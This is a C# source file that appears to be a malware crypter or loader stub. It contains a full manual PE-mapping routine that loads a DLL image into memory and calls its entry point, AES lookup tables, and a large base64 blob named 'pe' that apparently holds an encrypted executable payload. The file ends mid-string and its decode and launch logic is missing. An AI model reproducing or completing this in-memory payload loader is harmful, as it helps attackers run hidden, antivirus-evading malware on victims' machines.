using System;
using System.Runtime.InteropServices;

internal class Stub
{
	internal struct IMAGE_EXPORT_DIRECTORY
	{
		public uint Characteristics;

		public uint TimeDateStamp;

		public ushort MajorVersion;

		public ushort MinorVersion;

		public uint Name;

		public uint Base;

		public uint NumberOfFunctions;

		public uint NumberOfNames;

		public uint AddressOfFunctions;

		public uint AddressOfNames;

		public uint AddressOfNameOrdinals;
	}

	internal struct IMAGE_IMPORT_BY_NAME
	{
		public short Hint;

		public byte Name;
	}

	internal struct MEMORYMODULE
	{
		public IMAGE_NT_HEADERS headers;

		public IntPtr codeBase;

		public IntPtr modules;

		public int numModules;

		public int initialized;
	}

	internal struct IMAGE_BASE_RELOCATION
	{
		public uint VirtualAddress;

		public uint SizeOfBlock;
	}

	internal struct IMAGE_IMPORT_DESCRIPTOR
	{
		public uint CharacteristicsOrOriginalFirstThunk;

		public uint TimeDateStamp;

		public uint ForwarderChain;

		public uint Name;

		public uint FirstThunk;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_SECTION_HEADER
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] Name;

		public uint PhysicalAddress;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint PointerToRelocations;

		public uint PointerToLinenumbers;

		public short NumberOfRelocations;

		public short NumberOfLinenumbers;

		public uint Characteristics;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_DOS_HEADER
	{
		public ushort e_magic;

		public ushort e_cblp;

		public ushort e_cp;

		public ushort e_crlc;

		public ushort e_cparhdr;

		public ushort e_minalloc;

		public ushort e_maxalloc;

		public ushort e_ss;

		public ushort e_sp;

		public ushort e_csum;

		public ushort e_ip;

		public ushort e_cs;

		public ushort e_lfarlc;

		public ushort e_ovno;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] e_res1;

		public ushort e_oemid;

		public ushort e_oeminfo;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] e_res2;

		public int e_lfanew;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_DATA_DIRECTORY
	{
		public uint VirtualAddress;

		public uint Size;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_OPTIONAL_HEADER32
	{
		public ushort Magic;

		public byte MajorLinkerVersion;

		public byte MinorLinkerVersion;

		public uint SizeOfCode;

		public uint SizeOfInitializedData;

		public uint SizeOfUninitializedData;

		public uint AddressOfEntryPoint;

		public uint BaseOfCode;

		public uint BaseOfData;

		public uint ImageBase;

		public uint SectionAlignment;

		public uint FileAlignment;

		public ushort MajorOperatingSystemVersion;

		public ushort MinorOperatingSystemVersion;

		public ushort MajorImageVersion;

		public ushort MinorImageVersion;

		public ushort MajorSubsystemVersion;

		public ushort MinorSubsystemVersion;

		public uint Win32VersionValue;

		public uint SizeOfImage;

		public uint SizeOfHeaders;

		public uint CheckSum;

		public ushort Subsystem;

		public ushort DllCharacteristics;

		public uint SizeOfStackReserve;

		public uint SizeOfStackCommit;

		public uint SizeOfHeapReserve;

		public uint SizeOfHeapCommit;

		public uint LoaderFlags;

		public uint NumberOfRvaAndSizes;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public IMAGE_DATA_DIRECTORY[] DataDirectory;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_FILE_HEADER
	{
		public ushort Machine;

		public ushort NumberOfSections;

		public uint TimeDateStamp;

		public uint PointerToSymbolTable;

		public uint NumberOfSymbols;

		public ushort SizeOfOptionalHeader;

		public ushort Characteristics;
	}

	internal struct IMAGE_NT_HEADERS
	{
		public uint Signature;

		public IMAGE_FILE_HEADER FileHeader;

		public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
	}

	internal class ManualMap
	{
		internal class Win32Constants
		{
			public static uint MEM_COMMIT = 4096u;

			public static uint PAGE_EXECUTE_READWRITE = 64u;

			public static uint PAGE_READWRITE = 4u;

			public static uint MEM_RELEASE = 32768u;

			public static uint MEM_RESERVE = 8192u;
		}

		internal static class Win32Imports
		{
			[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
			public static extern uint GetProcAddress(IntPtr hModule, string procName);

			[DllImport("kernel32")]
			public static extern int LoadLibrary(string lpFileName);

			[DllImport("kernel32")]
			public static extern uint GetLastError();

			[DllImport("kernel32.dll")]
			public static extern IntPtr GetProcAddress(IntPtr module, IntPtr ordinal);

			[DllImport("kernel32")]
			public static extern uint VirtualAlloc(uint lpStartAddr, uint size, uint flAllocationType, uint flProtect);

			[DllImport("kernel32.dll", SetLastError = true)]
			internal static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

			[DllImport("kernel32.dll", SetLastError = true)]
			internal static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
		}

		internal static class PointerHelpers
		{
			public unsafe static T ToStruct<T>(byte[] data) where T : struct
			{
				fixed (byte* value = &data[0])
				{
					return (T)Marshal.PtrToStructure(new IntPtr(value), typeof(T));
				}
			}

			public unsafe static T ToStruct<T>(byte[] data, uint from) where T : struct
			{
				fixed (byte* value = &data[from])
				{
					return (T)Marshal.PtrToStructure(new IntPtr(value), typeof(T));
				}
			}

			public static T ToStruct<T>(IntPtr ptr, uint from) where T : struct
			{
				return (T)Marshal.PtrToStructure(new IntPtr(ptr.ToInt32() + (int)from), typeof(T));
			}
		}

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private unsafe delegate bool fnDllEntry(int instance, uint reason, void* reserved);

		private static readonly int[][][] ProtectionFlags = new int[2][][];

		private MEMORYMODULE module;

		internal unsafe bool LoadLibrary(byte[] data)
		{
			IMAGE_DOS_HEADER dosHeader = PointerHelpers.ToStruct<IMAGE_DOS_HEADER>(data);
			IMAGE_NT_HEADERS oldHeaders = PointerHelpers.ToStruct<IMAGE_NT_HEADERS>(data, (uint)dosHeader.e_lfanew);
			IntPtr intPtr = (IntPtr)Win32Imports.VirtualAlloc(oldHeaders.OptionalHeader.ImageBase, oldHeaders.OptionalHeader.SizeOfImage, Win32Constants.MEM_RESERVE, Win32Constants.PAGE_READWRITE);
			if (intPtr.ToInt32() == 0)
			{
				intPtr = (IntPtr)Win32Imports.VirtualAlloc((uint)(int)intPtr, oldHeaders.OptionalHeader.SizeOfImage, Win32Constants.MEM_RESERVE, Win32Constants.PAGE_READWRITE);
			}
			module = new MEMORYMODULE
			{
				codeBase = intPtr,
				numModules = 0,
				modules = new IntPtr(0),
				initialized = 0
			};
			Win32Imports.VirtualAlloc((uint)(int)intPtr, oldHeaders.OptionalHeader.SizeOfImage, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE);
			IntPtr intPtr2 = (IntPtr)Win32Imports.VirtualAlloc((uint)(int)intPtr, oldHeaders.OptionalHeader.SizeOfHeaders, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE);
			Marshal.Copy(data, 0, intPtr2, (int)(dosHeader.e_lfanew + oldHeaders.OptionalHeader.SizeOfHeaders));
			module.headers = PointerHelpers.ToStruct<IMAGE_NT_HEADERS>(intPtr2, (uint)dosHeader.e_lfanew);
			module.headers.OptionalHeader.ImageBase = (uint)(int)intPtr;
			CopySections(data, oldHeaders, intPtr2, dosHeader);
			uint num = (uint)(int)new IntPtr(intPtr.ToInt32() - (int)oldHeaders.OptionalHeader.ImageBase);
			if (num != 0)
			{
				PerformBaseRelocation(num);
			}
			BuildImportTable();
			FinalizeSections(intPtr2, dosHeader, oldHeaders);
			bool flag = false;
			try
			{
				fnDllEntry fnDllEntry = (fnDllEntry)Marshal.GetDelegateForFunctionPointer(new IntPtr(module.codeBase.ToInt32() + (int)module.headers.OptionalHeader.AddressOfEntryPoint), typeof(fnDllEntry));
				return fnDllEntry(intPtr.ToInt32(), 1u, null);
			}
			catch
			{
				return false;
			}
		}

		public int GetModuleCount()
		{
			int num = 0;
			IntPtr codeBase = module.codeBase;
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[1];
			if (iMAGE_DATA_DIRECTORY.Size != 0)
			{
				IMAGE_IMPORT_DESCRIPTOR iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
				while (iMAGE_IMPORT_DESCRIPTOR.Name != 0)
				{
					IntPtr ptr = new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.Name);
					string lpFileName = Marshal.PtrToStringAnsi(ptr);
					int num2 = Win32Imports.LoadLibrary(lpFileName);
					if (num2 == -1)
					{
						break;
					}
					num++;
					iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, (uint)(iMAGE_DATA_DIRECTORY.VirtualAddress + Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR)) * num));
				}
			}
			return num;
		}

		public unsafe int BuildImportTable()
		{
			int moduleCount = GetModuleCount();
			module.modules = Marshal.AllocHGlobal(moduleCount * 4);
			int num = 0;
			int result = 1;
			IntPtr codeBase = module.codeBase;
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[1];
			if (iMAGE_DATA_DIRECTORY.Size != 0)
			{
				IMAGE_IMPORT_DESCRIPTOR iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
				while (iMAGE_IMPORT_DESCRIPTOR.Name != 0)
				{
					IntPtr ptr = new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.Name);
					string lpFileName = Marshal.PtrToStringAnsi(ptr);
					int num2 = Win32Imports.LoadLibrary(lpFileName);
					if (num2 != -1)
					{
						uint* ptr2;
						uint* ptr3;
						if (iMAGE_IMPORT_DESCRIPTOR.CharacteristicsOrOriginalFirstThunk != 0)
						{
							IntPtr intPtr = new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.CharacteristicsOrOriginalFirstThunk);
							ptr2 = (uint*)(void*)intPtr;
							ptr3 = (uint*)(void*)new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.FirstThunk);
						}
						else
						{
							ptr2 = (uint*)(void*)new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.FirstThunk);
							ptr3 = (uint*)(void*)new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.FirstThunk);
						}
						while (*ptr2 != 0)
						{
							if ((*ptr2 & 0x80000000u) != 0)
							{
								*ptr3 = (uint)(int)Win32Imports.GetProcAddress(new IntPtr(num2), new IntPtr(*ptr2 & 0xFFFF));
							}
							else
							{
								IntPtr ptr4 = new IntPtr(codeBase.ToInt32() + (int)(*ptr2) + 2);
								string procName = Marshal.PtrToStringAnsi(ptr4);
								*ptr3 = Win32Imports.GetProcAddress(new IntPtr(num2), procName);
							}
							if (*ptr3 != 0)
							{
								ptr2++;
								ptr3++;
								continue;
							}
							result = 0;
							break;
						}
						num++;
						iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress + (uint)(Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR)) * num));
						continue;
					}
					result = 0;
					break;
				}
			}
			return result;
		}

		public void FinalizeSections(IntPtr headers, IMAGE_DOS_HEADER dosHeader, IMAGE_NT_HEADERS oldHeaders)
		{
			ProtectionFlags[0] = new int[2][];
			ProtectionFlags[1] = new int[2][];
			ProtectionFlags[0][0] = new int[2];
			ProtectionFlags[0][1] = new int[2];
			ProtectionFlags[1][0] = new int[2];
			ProtectionFlags[1][1] = new int[2];
			ProtectionFlags[0][0][0] = 1;
			ProtectionFlags[0][0][1] = 8;
			ProtectionFlags[0][1][0] = 2;
			ProtectionFlags[0][1][1] = 4;
			ProtectionFlags[1][0][0] = 16;
			ProtectionFlags[1][0][1] = 128;
			ProtectionFlags[1][1][0] = 32;
			ProtectionFlags[1][1][1] = 64;
			IMAGE_SECTION_HEADER iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader));
			for (int i = 0; i < module.headers.FileHeader.NumberOfSections; i++)
			{
				int num = (((iMAGE_SECTION_HEADER.Characteristics & 0x20000000u) != 0) ? 1 : 0);
				int num2 = (((iMAGE_SECTION_HEADER.Characteristics & 0x40000000u) != 0) ? 1 : 0);
				int num3 = (((iMAGE_SECTION_HEADER.Characteristics & 0x80000000u) != 0) ? 1 : 0);
				if ((iMAGE_SECTION_HEADER.Characteristics & 0x2000000u) != 0)
				{
					Win32Imports.VirtualFree(new IntPtr(iMAGE_SECTION_HEADER.PhysicalAddress), (UIntPtr)iMAGE_SECTION_HEADER.SizeOfRawData, 16384u);
					continue;
				}
				uint num4 = (uint)ProtectionFlags[num][num2][num3];
				if ((iMAGE_SECTION_HEADER.Characteristics & 0x4000000u) != 0)
				{
					num4 |= 0x200u;
				}
				int num5 = (int)iMAGE_SECTION_HEADER.SizeOfRawData;
				if (num5 == 0)
				{
					if ((iMAGE_SECTION_HEADER.Characteristics & 0x40u) != 0)
					{
						num5 = (int)module.headers.OptionalHeader.SizeOfInitializedData;
					}
					else if ((iMAGE_SECTION_HEADER.Characteristics & 0x80u) != 0)
					{
						num5 = (int)module.headers.OptionalHeader.SizeOfUninitializedData;
					}
				}
				if (num5 > 0)
				{
					Win32Imports.VirtualProtect(new IntPtr(iMAGE_SECTION_HEADER.PhysicalAddress), iMAGE_SECTION_HEADER.SizeOfRawData, num4, out var _);
				}
				iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i + 1)));
			}
		}

		public unsafe void PerformBaseRelocation(uint delta)
		{
			IntPtr codeBase = module.codeBase;
			int num = Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION));
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[5];
			int num2 = 0;
			if (iMAGE_DATA_DIRECTORY.Size == 0)
			{
				return;
			}
			IMAGE_BASE_RELOCATION iMAGE_BASE_RELOCATION = PointerHelpers.ToStruct<IMAGE_BASE_RELOCATION>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
			while (iMAGE_BASE_RELOCATION.VirtualAddress != 0)
			{
				IntPtr intPtr = (IntPtr)(codeBase.ToInt32() + (int)iMAGE_BASE_RELOCATION.VirtualAddress);
				ushort* ptr = (ushort*)(codeBase.ToInt32() + (int)iMAGE_DATA_DIRECTORY.VirtualAddress + num);
				uint num3 = 0u;
				while (num3 < (iMAGE_BASE_RELOCATION.SizeOfBlock - Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION))) / 2L)
				{
					int num4 = *ptr >> 12;
					int num5 = *ptr & 0xFFF;
					int num6 = num4;
					if (num6 != 0 && num6 == 3)
					{
						uint* ptr2 = (uint*)(void*)new IntPtr(intPtr.ToInt32() + num5);
						*ptr2 += delta;
					}
					num3++;
					ptr++;
				}
				num2 += (int)iMAGE_BASE_RELOCATION.SizeOfBlock;
				iMAGE_BASE_RELOCATION = PointerHelpers.ToStruct<IMAGE_BASE_RELOCATION>(codeBase, (uint)(iMAGE_DATA_DIRECTORY.VirtualAddress + num2));
			}
		}

		public unsafe uint GetProcAddress(string name)
		{
			IntPtr codeBase = module.codeBase;
			int num = -1;
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[0];
			if (iMAGE_DATA_DIRECTORY.Size == 0)
			{
				return 0u;
			}
			IMAGE_EXPORT_DIRECTORY iMAGE_EXPORT_DIRECTORY = PointerHelpers.ToStruct<IMAGE_EXPORT_DIRECTORY>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
			uint* ptr = (uint*)(void*)new IntPtr(codeBase.ToInt32() + iMAGE_EXPORT_DIRECTORY.AddressOfNames);
			ushort* ptr2 = (ushort*)(void*)new IntPtr(codeBase.ToInt32() + iMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals);
			uint num2 = 0u;
			while (num2 < iMAGE_EXPORT_DIRECTORY.NumberOfNames)
			{
				IntPtr ptr3 = new IntPtr(codeBase.ToInt32() + (int)(*ptr));
				string text = Marshal.PtrToStringAnsi(ptr3);
				if (!(text == name))
				{
					num2++;
					ptr++;
					ptr2++;
					continue;
				}
				num = *ptr2;
				break;
			}
			uint* ptr4 = (uint*)(codeBase.ToInt32() + (iMAGE_EXPORT_DIRECTORY.AddressOfFunctions + num * 4));
			return (uint)(codeBase.ToInt32() + *ptr4);
		}

		public void CopySections(byte[] data, IMAGE_NT_HEADERS oldHeaders, IntPtr headers, IMAGE_DOS_HEADER dosHeader)
		{
			IntPtr codeBase = module.codeBase;
			IMAGE_SECTION_HEADER iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader));
			for (int i = 0; i < module.headers.FileHeader.NumberOfSections; i++)
			{
				if (iMAGE_SECTION_HEADER.SizeOfRawData == 0)
				{
					uint sectionAlignment = oldHeaders.OptionalHeader.SectionAlignment;
					if (sectionAlignment != 0)
					{
						IntPtr intPtr = new IntPtr(Win32Imports.VirtualAlloc((uint)(int)new IntPtr(codeBase.ToInt32() + (int)iMAGE_SECTION_HEADER.VirtualAddress), sectionAlignment, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE));
						iMAGE_SECTION_HEADER.PhysicalAddress = (uint)(int)intPtr;
						IntPtr ptr = new IntPtr(headers.ToInt32() + (32 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader) + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * i);
						Marshal.WriteInt32(ptr, (int)intPtr);
						byte[] source = new byte[sectionAlignment + 1];
						Marshal.Copy(source, 0, intPtr, (int)sectionAlignment);
					}
					iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i + 1)));
				}
				else
				{
					IntPtr intPtr = new IntPtr(Win32Imports.VirtualAlloc((uint)(int)new IntPtr(codeBase.ToInt32() + (int)iMAGE_SECTION_HEADER.VirtualAddress), iMAGE_SECTION_HEADER.SizeOfRawData, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE));
					Marshal.Copy(data, (int)iMAGE_SECTION_HEADER.PointerToRawData, intPtr, (int)iMAGE_SECTION_HEADER.SizeOfRawData);
					iMAGE_SECTION_HEADER.PhysicalAddress = (uint)(int)intPtr;
					IntPtr ptr2 = new IntPtr(headers.ToInt32() + (32 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader) + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * i);
					Marshal.WriteInt32(ptr2, (int)intPtr);
					iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i + 1)));
				}
			}
		}
	}

	private static int Nb;

	private static int Nk;

	private static int Nr;

	private static byte[][] w;

	public static byte[] sbox = decode("Y3x3e/Jrb8UwAWcr/terdsqCyX36WUfwrdSir5ykcsC3/ZMmNj/3zDSl5fFx2DEVBMcjwxiWBZoHEoDi6yeydQmDLBobblqgUjvWsynjL4RT0QDtIPyxW2rLvjlKTFjP0O+q+0NNM4VF+QJ/UDyfqFGjQI+SnTj1vLbaIRD/89LNDBPsX5dEF8Snfj1kXRlzYIFP3CIqkIhG7rgU3l4L2+AyOgpJBiRcwtOsYpGV5HnnyDdtjdVOqWxW9Opleq4IunglLhymtMbo3XQfS72LinA+tWZIA/YOYTVXuYbBHZ7h+JgRadmOlJseh+nOVSjfjKGJDb/mQmhBmS0PsFS7Fg==");

	public static byte[] inv_sbox = decode("Uglq1TA2pTi/QKOegfPX+3zjOYKbL/+HNI5DRMTe6ctUe5QypsIjPe5MlQtC+sNOCC6hZijZJLJ2W6JJbYvRJXL49mSGaJgW1KRczF1ltpJscEhQ/e252l4VRlenjZ2EkNirAIy80wr35FgFuLNFBtAsHo/KPw8Cwa+9AwETims6kRFBT2fc6pfyz87wtOZzlqx0IuetNYXi+TfoHHXfbkfxGnEdKcWJb7diDqoYvhv8Vj5LxtJ5IJrbwP54zVr0H92oM4gHxzGxEhBZJ4DsX2BRf6kZtUoNLeV6n5PJnO+g4DtNrir1sMjruzyDU5lhFysEfrp31ibhaRRjVSEMfQ==");

	public static byte[] Rcon = decode("jQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjL");

	public static byte[] pe = decode("raV1QpqH/0PUT1P4ghDHKbET7p/kzCSzyveHywe0y2iNuDOze5mnRDyBStIJ2pvXUrrUZO546U71lZXds63bqQDATHR9l/L388ItyOKSg0mOL3waEokPW8MLr5tFFu1m03B4kQQUw2pdqb2ga1Yhbzg6py8jMLFIuYMiyvidIUUqRvbh7gBSXN5ZdZa0zN9ZPrHQSo6W2sh9GXN21fIoZafnKQysWG3R2kxqhmQZhxZK9ne5z1Mw0O90coJCxJgUDy7LRrbuK7W0S3TreSo1KFCQRGpGqm4+J11P/SWVp7ZwDh/ou/OalB4GegKB5h7bs1NxwlnauQjJEwlwB6J3deNvHrmqE3/MogRLBj0jnXonR4VjblDDlneyRo91ekETQ9CkDm+RNV44wZh8SbcUsICsA2fmSxshGXrPnLfN25lZd/+kUXCI/S+6J7sg1+A8c9Fw7shRxQoSKM+vDQby8Y24M7N7madEPIFK0gnam9e37u2DQtWNiA2QogfeoZS0jbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eJ+ZceiKEeGhkZNKDgZLPHjbgzs3uZp0Q8gUrSCdqb1/R/zspFZHpbAg72w/KNjeWt1Lkjz1Z0pnxRZjyLSUuQS6C3VeXC6MH35cbXbtATtaMgi0zQhu0Mu1pQo8nK8F7/sjZnmy/JpvUeXk1EsYabIb/wkAt/BvwNe72VOCVPSL8ADgbwbES3IjfWzD2RQoonY7pndI3HqmqRiQUNHONBSNQSbA1TTDRxW+7No1FqT4Mlhswb9ien7gktWjRKDoO4X02kdjEkPBPQI211yfDgjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9dRyCJvcAeHLFTquWZe/MBcjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eNuDOze5mnRDyBStIJ2pvXjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eNuDOze5mnRDyBStIJ2pvXjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eNuDOze5mnRDyBStIJ2pvXjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eNuDOze5mnRDyBStIJ2pvXjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eNuDOze5mnRDyBStIJ2pvXjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eNuDOze5mnRDyBStIJ2pvXjbgzs3uZp0Q8gUrSCdqb1424M7N7madEPIFK0gnam9eNuDOze5mnRDyBStIJ2pvXjbgzs3uZp0Q8gUrSCdqb15QqA2VWbJkiCOH1gFbRqSxpsawBzrdze5k3mxwRZoMWh9mgaosNY0mioIYTszzsKBVOMvmZCNvjTAOSsBAM8ClTsR+5l9QWldaAZTnJPK6yHiIyXKFlh6Dx+dFqhCzwYc15ACrb7pvq1ja6m8hRKwpXGAbPaA/+9lyNikm+LHBcdjo7zmYrrA2rPe3bqygAASYGjL84tjlXuDETjazLyhZus28v2478MYm5D8FCyhuKWHPJx5807YdjkC4GqwikJ72O/c397vcFpxSuKlZ5wq1wLWq2uyf9jB3qK0bDAVW1DqPL6I7GoUSxdWxkVoR+rJtmrEOT1RK8++DVCcDI8QuDDHjHFIKb6HBqT9oCsSvsS54MfMStEGJoGxigiNNf52E0SRqbzQgp9xVS4/fuMbQSQV2JMJV3pRkT8sXI2gvtHQUKF4rJ9XqsfOQ/5d3/SqUKJxT29zSAslI9PKIzlATLs/IOh0EJCb5UYiEmNQFxCtL16AlO8YqHy714dpQYCgRFyicUjelb5ZouGjaEA98Im0DCsxRjSFvxesmRWn+WUvU5JG0LEpd9IRVqLnSNPJ5R737PSOmBG2NiPQZPEiAVPjOGuTQnxhJ3UUcv6f6XWh2nssZ5vNZegrIVw44OR1yeG12pqhNBdU1YIa7+mN5/GLFTqFFEbxK9slzib35JasTMRUAjsVvumh29mXyFYXSPAXhuaAOUif8GDCz4i5zlwmguZDeQVpgm/xUPG2iLHywh7dTx8v/QpmuGbROat3FeubsTiNS7h2ot7Sb5lRklahhSLWF6YnI9hr3LaLIw++DRgwIriGhnLXU2T7CJnvdITO4eOFyPzpWU/KsbT417mRXa61uE99x7fWEAQKuUGumyaNAQhxtgqM7vDxvS6o8KvC9yk1zaQKhcJHJBMoG5Alwuk8znbTIYDoGNGvLjmRSOYwvDlU2Tys/A9Hx/EtQkCAF10onCW16vLY58yVQ0XCt3nPuDcwbXVm6ictbI1MxpQ1ZKB0Fq5ISPn22iTTEGJbeexSSgWqBQykxfS4GtaR/tADz7HeJwpJgWQTdtLQKrW5iBMdVhBiAsDGHL0Xh61NnHKGSxdWjSjvTRvRMIu5ETQri9aaF198gAQVlfAmQaRkS9YOPfXTBStXj9A95OcvjtpSIGFwjjkTZnqYwPMm25388zWgAwaw/HKXzZmUBS05GtcsM9lXBrX6T87GSrj/au70E256mIlOOKlqfJkdR3UPCnXVS+foo6lm2SolLSpnzVUYu/+CC4iUsXq/5ZMfCmVDDy9KIjgO8y8tCKFKFxOhDhZKTDTc0hSh6kdHecyxGFDDhTLtpaLjQRciR7Sr4Fpc/jbeEAiLnK7VpcsIqxZSk8JIiKryNkgBR5NjfzZ4x2xIckJ2w4eu/p+B0vqN86wc6zRo2jpY8/iELHxktl2w4bHv546dS8EXlTkFARyp2nRUXv+ytbLn86F/U0RxJ95tu6U4IHAN3P++31KM6t2LIK7a9JGJO9Hd3dlG16cxEvuwSLEP6pnRkP6o1ZyoUAiHbP44DtQwi8Uq39WmGLKMS4T64j6grJdRzSSm+7edGEthyBBAh4wrL2W47zWoLQ0uzlKTj/7S3PRPVR0SCQJ2DWzybPckSFsVaDu+l1shjXjOYDo4oI++OiL1PEK+9f88It4JSJi91CIdedTcBpghO7Ww/FPN8KOaulVm/xvde+V++N7PENUpb5xSJDk+sV4SEzTobjxouHr5NwuPZ68+48xPsnrRd6zsz1TG7rxQ4L3c0REf63Bk3AkYB3Sux0GEWuoWC5FKsrM/Xg83M5kICNEOhf1n+G2JtN3UFKW9O/9FJqOvJpXh8HSuDmwAIGo0jGJn3qC86k+Zijvij8XvxLrnrIy2QtQo5Jr9nfcAUCqjymecCHOv57ycvJhaRGB8UJc9FkX5lyS3Q39KyUZ5oNzLEbF7uDqQ6rCjbTdmvgHaW8w50ih7HmD/S51Cg+PFuwyQ2q96oDNfcNAiEGfriy5ik3DoePgJo47E46RiAqRFgHbE6+i6hQ9vxSGyshQeykHVw8E3zHR8Rp6hQDCUr+nv8w30/E5j19t1/gAJ6oJs34ccLMzcLoubPzh+JZXOwd0WmSrJk67wrsWseReKAkIAcvgiw7kY7gw+IMhPWMcvH+/UpDHSZW7Eh0pOZ15ojffj7sq504OIxxhUJiKnqlktuGTxFdDb6C5tW9ZRq04WVHLz+Z9NSBrBtcnVTs05nDX3Z0ME7hxid/KoJta0AtkioulHEbuU2hf2bcdDYYrMYmw7+cBvia/ZIqjlDdFLszrJS67HCFz8FPczgghNFU4ekwSi4JdQPPb+fJv2xPWAjohbkxiQU1Fko2OhhpGQdzqIpzWixgamC1R2X3qmHFTs6zgsrT4IzUqYh+5+5Gl4i5a5vyY112luWpKFIROulVGJiuRkhd4Z8jYRkcJqkJkwGkwoYhRMGlpBSfR0lTKR6ddCqcZMfGaRDDyHVwnzHm0d0QodHOhSQCb3H02NCiO9SzHKkMEDKn3JOJwpa3Amql/2Z59ecVCxDf/mXGzh4TXbghJddFhTGcfpP2aHDLlDRv1gQLgmTjUFwYBqJdz1hdBsXoz6dD14JLZqaYnJTxRRt8Fai40eArUn6ikaIhBrqXlUMGPm9jS